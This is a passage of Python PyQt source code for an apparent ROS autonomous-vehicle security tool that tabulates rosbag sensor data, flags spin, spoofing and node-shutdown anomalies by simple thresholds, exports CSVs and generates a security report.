        export_csv_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #047857; }
        """)
        export_csv_btn.clicked.connect(lambda: self.export_topic_csv(topic_name))
        bottom_toolbar.addWidget(export_csv_btn)

        export_filtered_btn = QPushButton("Export Filtered")
        export_filtered_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1d4ed8; }
        """)
        export_filtered_btn.clicked.connect(lambda: self.export_filtered_data(topic_name))
        bottom_toolbar.addWidget(export_filtered_btn)

        layout.addLayout(bottom_toolbar)

        return widget

    def create_topic_table(self, topic_name, topic_data):
        """Create formatted table for topic data with conditional formatting"""
        table = QTableWidget()
        table.setAlternatingRowColors(True)
        table.setStyleSheet("""
            QTableWidget {
                background-color: white;
                border: 1px solid #e5e7eb;
                border-radius: 4px;
                gridline-color: #e5e7eb;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background-color: #dbeafe;
                color: #1e40af;
            }
            QHeaderView::section {
                background-color: #f3f4f6;
                padding: 8px;
                border: 1px solid #e5e7eb;
                font-weight: bold;
            }
        """)

        msg_type = topic_data['type']
        messages = topic_data['messages']

        # Determine columns and data extraction based on message type
        if 'Twist' in msg_type:
            headers = ['#', 'Timestamp', 'Linear X', 'Linear Y', 'Linear Z', 'Angular X', 'Angular Y', 'Angular Z', 'Status']
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.setRowCount(len(messages))

            for i, msg_data in enumerate(messages):
                msg = msg_data['message']
                table.setItem(i, 0, QTableWidgetItem(str(i+1)))
                table.setItem(i, 1, QTableWidgetItem(f"{msg_data['timestamp']:.6f}"))
                table.setItem(i, 2, QTableWidgetItem(f"{msg.linear.x:.4f}"))
                table.setItem(i, 3, QTableWidgetItem(f"{msg.linear.y:.4f}"))
                table.setItem(i, 4, QTableWidgetItem(f"{msg.linear.z:.4f}"))
                table.setItem(i, 5, QTableWidgetItem(f"{msg.angular.x:.4f}"))
                table.setItem(i, 6, QTableWidgetItem(f"{msg.angular.y:.4f}"))
                table.setItem(i, 7, QTableWidgetItem(f"{msg.angular.z:.4f}"))

                # Conditional formatting for Twist messages (detect attacks)
                status_item = QTableWidgetItem()
                # Detect spin attack
                if abs(msg.linear.x) < 0.1 and abs(msg.angular.z) > 1.5:
                    status_item.setText("⚠️ SPIN ATTACK")
                    status_item.setBackground(QBrush(QColor(254, 202, 202)))  # Red
                    for col in range(8):
                        table.item(i, col).setBackground(QBrush(QColor(254, 202, 202)))
                # Detect high angular velocity
                elif abs(msg.angular.z) > 1.0:
                    status_item.setText("⚠️ High Angular")
                    status_item.setBackground(QBrush(QColor(254, 243, 199)))  # Yellow
                    for col in range(8):
                        table.item(i, col).setBackground(QBrush(QColor(254, 243, 199)))
                # Normal
                else:
                    status_item.setText("✓ Normal")
                    status_item.setBackground(QBrush(QColor(220, 252, 231)))  # Green

                table.setItem(i, 8, status_item)

        elif 'Odometry' in msg_type:
            headers = ['#', 'Timestamp', 'Pos X', 'Pos Y', 'Pos Z', 'Vel X', 'Vel Y', 'Vel Z', 'Jump (m)', 'Status']
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.setRowCount(len(messages))

            prev_pos = None
            for i, msg_data in enumerate(messages):
                msg = msg_data['message']
                pos_x = msg.pose.pose.position.x
                pos_y = msg.pose.pose.position.y
                pos_z = msg.pose.pose.position.z
                vel_x = msg.twist.twist.linear.x

                table.setItem(i, 0, QTableWidgetItem(str(i+1)))
                table.setItem(i, 1, QTableWidgetItem(f"{msg_data['timestamp']:.6f}"))
                table.setItem(i, 2, QTableWidgetItem(f"{pos_x:.4f}"))
                table.setItem(i, 3, QTableWidgetItem(f"{pos_y:.4f}"))
                table.setItem(i, 4, QTableWidgetItem(f"{pos_z:.4f}"))
                table.setItem(i, 5, QTableWidgetItem(f"{vel_x:.4f}"))
                table.setItem(i, 6, QTableWidgetItem(f"{msg.twist.twist.linear.y:.4f}"))
                table.setItem(i, 7, QTableWidgetItem(f"{msg.twist.twist.linear.z:.4f}"))

                # Calculate position jump
                jump = 0
                if prev_pos:
                    jump = np.sqrt((pos_x - prev_pos[0])**2 + (pos_y - prev_pos[1])**2 + (pos_z - prev_pos[2])**2)
                table.setItem(i, 8, QTableWidgetItem(f"{jump:.4f}"))

                # Conditional formatting
                status_item = QTableWidgetItem()
                if jump > 5.0:
                    status_item.setText("⚠️ LARGE JUMP")
                    status_item.setBackground(QBrush(QColor(254, 202, 202)))
                    for col in range(9):
                        table.item(i, col).setBackground(QBrush(QColor(254, 202, 202)))
                elif vel_x < -1.0 or vel_x > 10.0:
                    status_item.setText("⚠️ Bad Velocity")
                    status_item.setBackground(QBrush(QColor(254, 243, 199)))
                    for col in range(9):
                        table.item(i, col).setBackground(QBrush(QColor(254, 243, 199)))
                else:
                    status_item.setText("✓ Normal")
                    status_item.setBackground(QBrush(QColor(220, 252, 231)))

                table.setItem(i, 9, status_item)
                prev_pos = (pos_x, pos_y, pos_z)

        elif 'Imu' in msg_type:
            headers = ['#', 'Timestamp', 'Ang Vel X', 'Ang Vel Y', 'Ang Vel Z', 'Lin Acc X', 'Lin Acc Y', 'Lin Acc Z', 'Status']
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.setRowCount(len(messages))

            for i, msg_data in enumerate(messages):
                msg = msg_data['message']
                table.setItem(i, 0, QTableWidgetItem(str(i+1)))
                table.setItem(i, 1, QTableWidgetItem(f"{msg_data['timestamp']:.6f}"))
                table.setItem(i, 2, QTableWidgetItem(f"{msg.angular_velocity.x:.4f}"))
                table.setItem(i, 3, QTableWidgetItem(f"{msg.angular_velocity.y:.4f}"))
                table.setItem(i, 4, QTableWidgetItem(f"{msg.angular_velocity.z:.4f}"))
                table.setItem(i, 5, QTableWidgetItem(f"{msg.linear_acceleration.x:.4f}"))
                table.setItem(i, 6, QTableWidgetItem(f"{msg.linear_acceleration.y:.4f}"))
                table.setItem(i, 7, QTableWidgetItem(f"{msg.linear_acceleration.z:.4f}"))

                # Conditional formatting
                status_item = QTableWidgetItem()
                if abs(msg.angular_velocity.z) > 5.0:
                    status_item.setText("⚠️ HIGH ANG VEL")
                    status_item.setBackground(QBrush(QColor(254, 202, 202)))
                    for col in range(8):
                        table.item(i, col).setBackground(QBrush(QColor(254, 202, 202)))
                elif abs(msg.linear_acceleration.x) > 20.0:
                    status_item.setText("⚠️ HIGH ACCEL")
                    status_item.setBackground(QBrush(QColor(254, 243, 199)))
                    for col in range(8):
                        table.item(i, col).setBackground(QBrush(QColor(254, 243, 199)))
                else:
                    status_item.setText("✓ Normal")
                    status_item.setBackground(QBrush(QColor(220, 252, 231)))

                table.setItem(i, 8, status_item)

        else:
            # Generic table for unknown message types
            headers = ['#', 'Timestamp', 'Message']
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.setRowCount(len(messages))

            for i, msg_data in enumerate(messages):
                table.setItem(i, 0, QTableWidgetItem(str(i+1)))
                table.setItem(i, 1, QTableWidgetItem(f"{msg_data['timestamp']:.6f}"))
                table.setItem(i, 2, QTableWidgetItem(str(msg_data['message'])[:100]))

        # Configure table
        table.horizontalHeader().setStretchLastSection(True)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeToContents)
        table.setSelectionBehavior(QTableWidget.SelectRows)
        table.setEditTriggers(QTableWidget.NoEditTriggers)

        return table

    def filter_table(self, topic_name, search_text):
        """Filter table rows based on search text"""
        # Find the table widget
        for widget in self.topic_tabs.findChildren(QTableWidget):
            if widget.objectName() == f"table_{topic_name}":
                for row in range(widget.rowCount()):
                    should_show = False
                    if not search_text:
                        should_show = True
                    else:
                        # Search all columns
                        for col in range(widget.columnCount()):
                            item = widget.item(row, col)
                            if item and search_text.lower() in item.text().lower():
                                should_show = True
                                break
                    widget.setRowHidden(row, not should_show)
                break

    def toggle_anomaly_highlighting(self, topic_name, state):
        """Toggle anomaly highlighting in table"""
        # Find the table widget
        for widget in self.topic_tabs.findChildren(QTableWidget):
            if widget.objectName() == f"table_{topic_name}":
                if state == Qt.Checked:
                    # Re-apply conditional formatting (already done in create_topic_table)
                    pass
                else:
                    # Remove highlighting
                    for row in range(widget.rowCount()):
                        for col in range(widget.columnCount()):
                            item = widget.item(row, col)
                            if item:
                                item.setBackground(QBrush(QColor(255, 255, 255)))
                break

    def show_topic_statistics(self, topic_name):
        """Show statistical analysis for the topic"""
        topic_data = self.bag_data['topics'][topic_name]
        msg_type = topic_data['type']
        messages = topic_data['messages']

        stats_text = []
        stats_text.append(f"STATISTICAL ANALYSIS: {topic_name}")
        stats_text.append("=" * 60)
        stats_text.append(f"Message Type: {msg_type}")
        stats_text.append(f"Total Messages: {len(messages)}")
        stats_text.append(f"Frequency: {topic_data['frequency']:.2f} Hz")

        if 'Twist' in msg_type:
            linear_x = [msg['message'].linear.x for msg in messages]
            angular_z = [msg['message'].angular.z for msg in messages]

            stats_text.append("\nLinear X Statistics:")
            stats_text.append(f"  Mean: {np.mean(linear_x):.4f}")
            stats_text.append(f"  Std Dev: {np.std(linear_x):.4f}")
            stats_text.append(f"  Min: {np.min(linear_x):.4f}")
            stats_text.append(f"  Max: {np.max(linear_x):.4f}")

            stats_text.append("\nAngular Z Statistics:")
            stats_text.append(f"  Mean: {np.mean(angular_z):.4f}")
            stats_text.append(f"  Std Dev: {np.std(angular_z):.4f}")
            stats_text.append(f"  Min: {np.min(angular_z):.4f}")
            stats_text.append(f"  Max: {np.max(angular_z):.4f}")

        elif 'Odometry' in msg_type:
            vel_x = [msg['message'].twist.twist.linear.x for msg in messages]
            pos_x = [msg['message'].pose.pose.position.x for msg in messages]

            stats_text.append("\nVelocity X Statistics:")
            stats_text.append(f"  Mean: {np.mean(vel_x):.4f}")
            stats_text.append(f"  Std Dev: {np.std(vel_x):.4f}")
            stats_text.append(f"  Min: {np.min(vel_x):.4f}")
            stats_text.append(f"  Max: {np.max(vel_x):.4f}")

            stats_text.append("\nPosition X Statistics:")
            stats_text.append(f"  Start: {pos_x[0]:.4f}")
            stats_text.append(f"  End: {pos_x[-1]:.4f}")
            stats_text.append(f"  Distance Traveled: {abs(pos_x[-1] - pos_x[0]):.4f}")

        elif 'Imu' in msg_type:
            ang_vel_z = [msg['message'].angular_velocity.z for msg in messages]
            lin_acc_x = [msg['message'].linear_acceleration.x for msg in messages]

            stats_text.append("\nAngular Velocity Z Statistics:")
            stats_text.append(f"  Mean: {np.mean(ang_vel_z):.4f}")
            stats_text.append(f"  Std Dev: {np.std(ang_vel_z):.4f}")
            stats_text.append(f"  Min: {np.min(ang_vel_z):.4f}")
            stats_text.append(f"  Max: {np.max(ang_vel_z):.4f}")

            stats_text.append("\nLinear Acceleration X Statistics:")
            stats_text.append(f"  Mean: {np.mean(lin_acc_x):.4f}")
            stats_text.append(f"  Std Dev: {np.std(lin_acc_x):.4f}")
            stats_text.append(f"  Min: {np.min(lin_acc_x):.4f}")
            stats_text.append(f"  Max: {np.max(lin_acc_x):.4f}")

        # Show in message box
        QMessageBox.information(self, "Topic Statistics", "\n".join(stats_text))

    def export_filtered_data(self, topic_name):
        """Export currently filtered/visible data to CSV"""
        # Find the table widget
        table = None
        for widget in self.topic_tabs.findChildren(QTableWidget):
            if widget.objectName() == f"table_{topic_name}":
                table = widget
                break

        if not table:
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            f"Save Filtered {topic_name} CSV",
            f"filtered_{topic_name.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV Files (*.csv)"
        )

        if file_path:
            try:
                with open(file_path, 'w', newline='') as f:
                    writer = csv.writer(f)

                    # Write header
                    headers = []
                    for col in range(table.columnCount()):
                        headers.append(table.horizontalHeaderItem(col).text())
                    writer.writerow(headers)

                    # Write visible rows only
                    for row in range(table.rowCount()):
                        if not table.isRowHidden(row):
                            row_data = []
                            for col in range(table.columnCount()):
                                item = table.item(row, col)
                                row_data.append(item.text() if item else "")
                            writer.writerow(row_data)

                self.add_log(f"Filtered data exported to: {file_path}")
                QMessageBox.information(self, "Success", f"Filtered data exported successfully")
            except Exception as e:
                self.add_log(f"Export error: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to export:\n{str(e)}")

    def create_attack_detection_widget(self):
        """Create attack detection widget with security analysis tools"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)

        # Header
        header = QLabel("Security Analysis & Attack Detection")
        header.setFont(QFont('Arial', 14, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        layout.addWidget(header)

        # Run analysis button
        analyze_btn = QPushButton("Run Security Analysis")
        analyze_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 12pt;
            }
            QPushButton:hover { background-color: #b91c1c; }
        """)
        analyze_btn.clicked.connect(self.run_security_analysis)
        layout.addWidget(analyze_btn)

        # Results area
        self.attack_results = QTextEdit()
        self.attack_results.setReadOnly(True)
        self.attack_results.setStyleSheet("""
            QTextEdit {
                background-color: #f9fafb;
                border: 2px solid #e5e7eb;
                border-radius: 6px;
                padding: 15px;
                font-family: 'Courier New', monospace;
                font-size: 10pt;
            }
        """)
        self.attack_results.setPlainText("Click 'Run Security Analysis' to detect attacks in the loaded bag file...")
        layout.addWidget(self.attack_results)

        return widget

    def run_security_analysis(self):
        """Run comprehensive security analysis on bag data"""
        if not self.bag_data:
            QMessageBox.warning(self, "No Data", "Please load a bag file first")
            return

        self.add_log("Running security analysis...")
        results = []
        results.append("=" * 80)
        results.append("SECURITY ANALYSIS REPORT")
        results.append("=" * 80)
        results.append(f"\nAnalyzed: {os.path.basename(self.bag_data['path'])}")
        results.append(f"Analysis Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Detect CMD_VEL attack
        results.extend(self.detect_cmd_vel_attack())

        # Detect odometry spoofing
        results.extend(self.detect_odom_spoofing())

        # Detect IMU spoofing
        results.extend(self.detect_imu_spoofing())

        # Detect parameter manipulation
        results.extend(self.detect_param_manipulation())

        # Detect node shutdown
        results.extend(self.detect_node_shutdown())

        # General anomaly detection
        results.extend(self.detect_anomalies())

        results.append("\n" + "=" * 80)
        results.append("END OF SECURITY ANALYSIS")
        results.append("=" * 80)

        self.attack_results.setPlainText("\n".join(results))
        self.add_log("Security analysis complete")

    def detect_cmd_vel_attack(self):
        """Detect CMD_VEL topic injection attacks"""
        results = ["\n[1] CMD_VEL INJECTION ATTACK DETECTION"]
        results.append("-" * 80)

        cmd_vel_topic = '/husky_velocity_controller/cmd_vel'
        if cmd_vel_topic not in self.bag_data['topics']:
            results.append("✓ No cmd_vel topic found - no injection detected")
            return results

        messages = self.bag_data['topics'][cmd_vel_topic]['messages']
        if len(messages) == 0:
            results.append("✓ No cmd_vel messages - no injection detected")
            return results

        # Check for rapid direction changes (attack signature)
        direction_changes = 0
        prev_linear = None
        prev_angular = None
        spin_detected = False

        for msg_data in messages:
            msg = msg_data['message']
            linear = msg.linear.x
            angular = msg.angular.z

            # Detect spin attack (linear=0, high angular velocity)
            if abs(linear) < 0.1 and abs(angular) > 1.5:
                spin_detected = True

            if prev_linear is not None:
                # Detect abrupt changes
                if abs(linear - prev_linear) > 0.5:
                    direction_changes += 1
                if abs(angular - prev_angular) > 1.0:
                    direction_changes += 1

            prev_linear = linear
            prev_angular = angular

        # Determine attack presence
        if spin_detected:
            results.append("⚠️  ATTACK DETECTED: Spin attack pattern identified")
            results.append(f"    - Detected: linear.x ≈ 0, angular.z > 1.5 (forced spin)")
        elif direction_changes > len(messages) * 0.3:
            results.append("⚠️  POSSIBLE ATTACK: High rate of direction changes")
            results.append(f"    - Direction changes: {direction_changes}/{len(messages)} messages")
        else:
            results.append("✓ No cmd_vel injection attack detected")

        return results

    def detect_odom_spoofing(self):
        """Detect odometry spoofing attacks"""
        results = ["\n[2] ODOMETRY SPOOFING DETECTION"]
        results.append("-" * 80)

        odom_topic = '/husky_velocity_controller/odom'
        if odom_topic not in self.bag_data['topics']:
            results.append("✓ No odometry topic found")
            return results

        messages = self.bag_data['topics'][odom_topic]['messages']
        if len(messages) < 10:
            results.append("✓ Insufficient odometry data")
            return results

        # Check for unrealistic jumps in position
        positions = []
        for msg_data in messages:
            msg = msg_data['message']
            positions.append((msg.pose.pose.position.x, msg.pose.pose.position.y))

        max_jump = 0
        for i in range(1, len(positions)):
            dx = positions[i][0] - positions[i-1][0]
            dy = positions[i][1] - positions[i-1][1]
            jump = np.sqrt(dx**2 + dy**2)
            max_jump = max(max_jump, jump)

        # Check for negative or excessive velocities (attack signature)
        suspicious_velocities = 0
        for msg_data in messages:
            msg = msg_data['message']
            vel = msg.twist.twist.linear.x
            if vel < -1.0 or vel > 10.0:  # Unrealistic velocities
                suspicious_velocities += 1

        if max_jump > 5.0:
            results.append(f"⚠️  ATTACK DETECTED: Unrealistic position jump ({max_jump:.2f}m)")
        elif suspicious_velocities > 0:
            results.append(f"⚠️  SUSPICIOUS: {suspicious_velocities} messages with unrealistic velocities")
        else:
            results.append("✓ No odometry spoofing detected")

        return results

    def detect_imu_spoofing(self):
        """Detect IMU data spoofing"""
        results = ["\n[3] IMU SPOOFING DETECTION"]
        results.append("-" * 80)

        imu_topic = '/imu/data'
        if imu_topic not in self.bag_data['topics']:
            results.append("✓ No IMU topic found")
            return results

        messages = self.bag_data['topics'][imu_topic]['messages']
        if len(messages) == 0:
            results.append("✓ No IMU messages")
            return results

        # Check for unrealistic angular velocities and accelerations
        high_angular_vel = 0
        high_accel = 0

        for msg_data in messages:
            msg = msg_data['message']

            # Check angular velocity
            if abs(msg.angular_velocity.z) > 5.0:
                high_angular_vel += 1

            # Check linear acceleration
            if abs(msg.linear_acceleration.x) > 20.0:
                high_accel += 1

        if high_angular_vel > len(messages) * 0.1:
            results.append(f"⚠️  ATTACK DETECTED: Excessive angular velocities ({high_angular_vel} messages)")
        elif high_accel > len(messages) * 0.1:
            results.append(f"⚠️  ATTACK DETECTED: Excessive accelerations ({high_accel} messages)")
        else:
            results.append("✓ No IMU spoofing detected")

        return results

    def detect_param_manipulation(self):
        """Detect parameter manipulation by analyzing message patterns"""
        results = ["\n[4] PARAMETER MANIPULATION DETECTION"]
        results.append("-" * 80)

        # Look for sudden changes in cmd_vel that might indicate parameter changes
        cmd_vel_topic = '/husky_velocity_controller/cmd_vel'
        if cmd_vel_topic not in self.bag_data['topics']:
            results.append("✓ No cmd_vel data to analyze")
            return results

        messages = self.bag_data['topics'][cmd_vel_topic]['messages']
        if len(messages) < 20:
            results.append("✓ Insufficient data")
            return results

        # Detect sudden speed changes that might indicate parameter tampering
        speeds = [msg_data['message'].linear.x for msg_data in messages]
        speed_changes = []
        for i in range(1, len(speeds)):
            change = abs(speeds[i] - speeds[i-1])
            if change > 2.0:  # Sudden change
                speed_changes.append((i, change))

        if len(speed_changes) > 3:
            results.append(f"⚠️  SUSPICIOUS: {len(speed_changes)} sudden speed changes detected")
            results.append("    - May indicate parameter manipulation attack")
        else:
            results.append("✓ No clear parameter manipulation detected")

        return results

    def detect_node_shutdown(self):
        """Detect node shutdown attacks by analyzing message gaps"""
        results = ["\n[5] NODE SHUTDOWN DETECTION"]
        results.append("-" * 80)

        # Check for large gaps in message timestamps across all topics
        max_gap = 0
        gap_topic = None

        for topic_name, topic_data in self.bag_data['topics'].items():
            messages = topic_data['messages']
            if len(messages) < 2:
                continue

            for i in range(1, len(messages)):
                gap = messages[i]['timestamp'] - messages[i-1]['timestamp']
                if gap > max_gap:
                    max_gap = gap
                    gap_topic = topic_name

        # If there's a gap > 2 seconds, might indicate shutdown
        if max_gap > 2.0:
            results.append(f"⚠️  SUSPICIOUS: {max_gap:.2f}s gap detected in {gap_topic}")
            results.append("    - May indicate node shutdown attack")
        else:
            results.append("✓ No node shutdown detected")

        return results

    def detect_anomalies(self):
        """General anomaly detection"""
        results = ["\n[6] GENERAL ANOMALY DETECTION"]
        results.append("-" * 80)

        # Check for topics with very low frequency (might be spoofed)
        low_freq_topics = []
        for topic_name, topic_data in self.bag_data['topics'].items():
            if topic_data['frequency'] < 1.0 and topic_data['message_count'] > 5:
                low_freq_topics.append(f"{topic_name} ({topic_data['frequency']:.2f} Hz)")

        if low_freq_topics:
            results.append(f"⚠️  Low frequency topics detected: {', '.join(low_freq_topics)}")
        else:
            results.append("✓ No frequency anomalies detected")

        return results

    def export_overview_csv(self):
        """Export bag overview to CSV"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Overview CSV",
            f"bag_overview_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV Files (*.csv)"
        )

        if file_path:
            try:
                with open(file_path, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Topic', 'Type', 'Message Count', 'Frequency (Hz)'])
                    for topic_name, topic_data in sorted(self.bag_data['topics'].items()):
                        writer.writerow([topic_name, topic_data['type'], topic_data['message_count'], f"{topic_data['frequency']:.2f}"])

                self.add_log(f"Overview exported to: {file_path}")
                QMessageBox.information(self, "Success", f"Overview exported successfully")
            except Exception as e:
                self.add_log(f"Export error: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to export:\n{str(e)}")

    def export_topic_csv(self, topic_name):
        """Export topic data to CSV"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            f"Save {topic_name} CSV",
            f"topic_{topic_name.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV Files (*.csv)"
        )

        if file_path:
            try:
                topic_data = self.bag_data['topics'][topic_name]
                with open(file_path, 'w', newline='') as f:
                    writer = csv.writer(f)

                    # Write header
                    writer.writerow(['Timestamp', 'Message'])

                    # Write data
                    for msg_data in topic_data['messages']:
                        writer.writerow([msg_data['timestamp'], str(msg_data['message'])])

                self.add_log(f"Topic {topic_name} exported to: {file_path}")
                QMessageBox.information(self, "Success", f"Topic data exported successfully")
            except Exception as e:
                self.add_log(f"Export error: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to export:\n{str(e)}")

    def create_report_tab(self):
        """Create the report generation tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(16)

        # Title
        title = QLabel("Generate Security Report")
        title.setFont(QFont('Arial', 16, QFont.Bold))
        title.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        layout.addWidget(title)

        # Description
        desc = QLabel("Generate a comprehensive security analysis report based on the vulnerabilities demonstrated and bag file analysis.")
        desc.setWordWrap(True)
        desc.setStyleSheet("color: #6b7280; margin-bottom: 20px;")
        layout.addWidget(desc)

        # Report options group
        options_group = QGroupBox("Report Options")
        options_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        options_layout = QVBoxLayout()

        # Report format
        format_label = QLabel("Report Format:")
        format_label.setFont(QFont('Arial', 10, QFont.Bold))
        options_layout.addWidget(format_label)

        self.report_format = QComboBox()
        self.report_format.addItems(["PDF Report", "HTML Report", "Markdown Report", "Text Report"])
        self.report_format.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 2px solid #e5e7eb;
                border-radius: 6px;
                background-color: white;
            }
        """)
        options_layout.addWidget(self.report_format)

        # Include sections checkboxes
        sections_label = QLabel("Include Sections:")
        sections_label.setFont(QFont('Arial', 10, QFont.Bold))
        sections_label.setStyleSheet("margin-top: 16px;")
        options_layout.addWidget(sections_label)

        self.include_exec_summary = QCheckBox("Executive Summary")
        self.include_exec_summary.setChecked(True)
        options_layout.addWidget(self.include_exec_summary)

        self.include_vulnerabilities = QCheckBox("Vulnerability Details")
        self.include_vulnerabilities.setChecked(True)
        options_layout.addWidget(self.include_vulnerabilities)

        self.include_attack_logs = QCheckBox("Attack Execution Logs")
        self.include_attack_logs.setChecked(True)
        options_layout.addWidget(self.include_attack_logs)

        self.include_bag_analysis = QCheckBox("Bag File Analysis")
        self.include_bag_analysis.setChecked(True)
        options_layout.addWidget(self.include_bag_analysis)

        self.include_recommendations = QCheckBox("Security Recommendations")
        self.include_recommendations.setChecked(True)
        options_layout.addWidget(self.include_recommendations)

        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        # Report preview area
        preview_group = QGroupBox("Report Preview")
        preview_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        preview_layout = QVBoxLayout()

        self.report_preview = QTextEdit()
        self.report_preview.setReadOnly(True)
        self.report_preview.setPlainText("Report preview will appear here after generation...")
        self.report_preview.setStyleSheet("""
            QTextEdit {
                background-color: #f9fafb;
                border: 1px solid #e5e7eb;
                border-radius: 4px;
                padding: 12px;
                font-family: 'Courier New', monospace;
            }
        """)
        preview_layout.addWidget(self.report_preview)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)

        # Action buttons
        button_layout = QHBoxLayout()
        button_layout.addStretch()

        generate_btn = QPushButton("Generate Report")
        generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #2563eb;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 11pt;
            }
            QPushButton:hover {
                background-color: #1d4ed8;
            }
            QPushButton:pressed {
                background-color: #1e40af;
            }
        """)
        generate_btn.clicked.connect(self.generate_report)
        button_layout.addWidget(generate_btn)

        save_btn = QPushButton("Save Report")
        save_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 11pt;
            }
            QPushButton:hover {
                background-color: #047857;
            }
            QPushButton:pressed {
                background-color: #065f46;
            }
        """)
        save_btn.clicked.connect(self.save_report)
        button_layout.addWidget(save_btn)

        layout.addLayout(button_layout)

        self.tabs.addTab(tab, "Generate Report")

    def generate_report(self):
        """Generate the security report"""
        self.add_log("Generating security report...")

        report_content = []
        report_content.append("=" * 80)
        report_content.append("AVSVA SECURITY ANALYSIS REPORT")
        report_content.append("=" * 80)
        report_content.append(f"\nGenerated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        if self.include_exec_summary.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("EXECUTIVE SUMMARY")
            report_content.append("=" * 80)
            report_content.append("\nThis report documents security vulnerabilities identified in ROS-based")
            report_content.append("autonomous vehicle systems through the AVSVA framework.")

        if self.include_vulnerabilities.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("IDENTIFIED VULNERABILITIES")
            report_content.append("=" * 80)
            for vuln in self.vulnerabilities:
                report_content.append(f"\n[{vuln['severity'].upper()}] {vuln['name']}")
                report_content.append(f"Category: {vuln['category']}")
                report_content.append(f"Description: {vuln['description']}")
                report_content.append(f"Impact: {vuln['impact']}\n")

        if self.include_recommendations.isChecked():
            report_content.append("\n" + "=" * 80)
            report_content.append("SECURITY RECOMMENDATIONS")
            report_content.append("=" * 80)
            report_content.append("\n1. Implement ROS authentication and encryption")
            report_content.append("2. Deploy network segmentation and firewalls")
            report_content.append("3. Use ROS-Defender or similar security frameworks")
            report_content.append("4. Implement input validation and rate limiting")
            report_content.append("5. Enable comprehensive logging and monitoring")
            report_content.append("6. Regular security audits and penetration testing\n")

        report_content.append("\n" + "=" * 80)
        report_content.append("END OF REPORT")
        report_content.append("=" * 80)

        self.report_preview.setPlainText("\n".join(report_content))
        self.add_log("Report generated successfully")

    def save_report(self):
        """Save the generated report to a file"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Report",
            f"avsva_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text Files (*.txt);;PDF Files (*.pdf);;HTML Files (*.html);;Markdown Files (*.md)"
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.report_preview.toPlainText())
                self.add_log(f"Report saved to: {file_path}")
                QMessageBox.information(self, "Success", f"Report saved successfully to:\n{file_path}")
            except Exception as e:
                self.add_log(f"Error saving report: {str(e)}")
                QMessageBox.critical(self, "Error", f"Failed to save report:\n{str(e)}")

    def add_log(self, message):
        """Add a message to the log output"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{timestamp}] {message}")
        self.log_output.verticalScrollBar().setValue(
            self.log_output.verticalScrollBar().maximum()
        )
    
    def start_simulation(self):
        """Start the simulation"""
        self.simulation_controller = SimulationController()
        self.simulation_controller.log_signal.connect(self.add_log)
        self.simulation_controller.status_signal.connect(self.update_sim_status)
        self.simulation_controller.start()
        
        self.start_sim_btn.setEnabled(False)
        self.stop_sim_btn.setEnabled(True)
    
    def stop_simulation(self):
        """Stop the simulation"""
        if self.simulation_controller:
            self.simulation_controller.stop()
            self.simulation_controller.wait()
        
        self.start_sim_btn.setEnabled(True)
        self.stop_sim_btn.setEnabled(False)
        self.start_rec_btn.setEnabled(False)
        self.stop_rec_btn.setEnabled(False)
    
    def update_sim_status(self, running):
        """Update simulation status indicator"""
        if running:
            self.status_indicator.setText("● Running")
            self.status_indicator.setStyleSheet("color: #10b981;")
